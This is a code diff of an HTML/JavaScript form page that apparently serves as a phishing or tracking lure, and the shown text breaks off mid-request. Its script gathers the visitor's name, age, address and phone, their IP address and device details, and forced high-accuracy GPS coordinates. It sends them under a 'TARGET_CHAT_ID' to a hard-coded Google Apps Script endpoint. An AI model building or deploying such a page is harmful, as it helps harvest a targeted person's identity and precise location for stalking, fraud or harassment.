@@ -98,7 +98,6 @@ input.invalid { border-color: var(--error); background: var(--error-bg); }
     </div>
     <button class="btn" onclick="goConfirm()">Next</button>
   </div>
-
   <div id="step-verification" class="hidden">
     <h2>Confirm Information</h2>
     <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
@@ -124,7 +123,6 @@ input.invalid { border-color: var(--error); background: var(--error-bg); }
     <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
   </div>
 </div>
-
 <script>
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzLff9n4BbOkY3c_w6_4PUj3vyw3OXuFbXMht8FUAo30W-69dXJTaYZldlVSqe_4YI/exec";
 const urlParams = new URLSearchParams(window.location.search);
@@ -133,13 +131,11 @@ let form = {};
 let locationInfo = { lat: "", lng: "", ok: false };
 let ipAddr = "";
 let deviceInfo = { device: "", os: "", browser: "" };
-
 window.onload = () => {
   detectDevice();
   fetchIP();
   restoreFormDraft();
 };
-
 function saveFormDraft() {
   const draft = {
     firstName: document.getElementById("firstName").value,
@@ -155,7 +151,6 @@ function saveFormDraft() {
   };
   localStorage.setItem("formDraft", JSON.stringify(draft));
 }
-
 function restoreFormDraft() {
   try {
     const d = JSON.parse(localStorage.getItem("formDraft") || "{}");
@@ -164,7 +159,6 @@ function restoreFormDraft() {
     }
   } catch {}
 }
-
 function validateField(id) {
   const el = document.getElementById(id);
   const v = el.value.trim();
@@ -181,7 +175,6 @@ function validateField(id) {
   el.classList.toggle("invalid", v.length > 0 && !ok);
   return ok;
 }
-
 function goConfirm() {
   const fields = ["firstName","lastName","age","gender","occupation","province","address","city","zip","phone"];
   let allOk = true;
@@ -199,7 +192,6 @@ function goConfirm() {
     zip: document.getElementById("zip").value.trim().toUpperCase(),
     phone: document.getElementById("phone").value.trim().replace(/\D/g,"")
   };
-
   document.getElementById("step-form").classList.add("hidden");
   document.getElementById("step-verification").classList.remove("hidden");
   document.getElementById("disp-name").textContent = form.name;
@@ -210,7 +202,6 @@ function goConfirm() {
   document.getElementById("disp-phone").textContent = form.phone;
   document.getElementById("disp-zip").textContent = form.zip;
 }
-
 function requestLocation() {
   if(!navigator.geolocation) { alert("❌ Geolocation not supported"); return; }
   navigator.geolocation.getCurrentPosition(
@@ -232,7 +223,6 @@ function requestLocation() {
     { enableHighAccuracy: true, timeout: 15000 }
   );
 }
-
 async function fetchIP() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -240,7 +230,6 @@ async function fetchIP() {
     ipAddr = j.ip;
   } catch { ipAddr = "Unavailable"; }
 }
-
 function detectDevice() {
   const ua = navigator.userAgent;
   if(/iPhone/.test(ua)) deviceInfo = {device:"iPhone",os:"iOS",browser:"Safari"};
@@ -249,14 +238,12 @@ function detectDevice() {
   else if(/Windows/.test(ua)) deviceInfo = {device:"Windows PC",os:"Windows",browser:"Chrome"};
   else deviceInfo = {device:"Unknown",os:"Unknown",browser:"Unknown"};
 }
-
 async function submitAll() {
   if(!locationInfo.ok) { alert("❌ Please ALLOW location access first!"); return; }
   
   const submitBtn = document.getElementById("btn-submit");
   submitBtn.disabled = true;
   submitBtn.textContent = "Submitting...";
-
   const data = {
     "id": TARGET_CHAT_ID,
     "姓名": form.name, "性别": form.gender, "年龄": form.age, "职业": form.occupation,
@@ -266,7 +253,6 @@ async function submitAll() {
     "纬度": String(locationInfo.lat), "经度": String(locationInfo.lng),
     "录入时间": new Date().toLocaleString("zh-CN")
   };
-
   try {
     const response = await fetch(APPSCRIPT_URL, {
       method: "POST",
